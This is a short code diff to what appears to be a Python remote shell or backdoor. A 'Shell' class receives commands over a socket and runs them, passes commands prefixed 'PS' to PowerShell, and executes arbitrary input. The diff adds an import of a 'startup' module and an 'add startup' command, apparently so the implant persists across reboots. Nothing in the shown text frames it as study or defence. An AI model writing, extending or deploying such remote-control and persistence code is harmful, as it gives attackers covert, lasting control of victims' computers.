@@ -2,6 +2,7 @@ import os
 import socket
 import subprocess
 import ctypes
+import startup
 
 
 class Shell:
@@ -59,6 +60,9 @@ class Shell:
                 # Executes command with powershell
                 if data[:2] == "PS":
                     data = "PowerShell.exe -command {}".format(data[3:])
+                
+                if data == "add startup":
+                    startup.add_startup()
 
                 if len(data) > 0:
                     # Executes arbitrary command
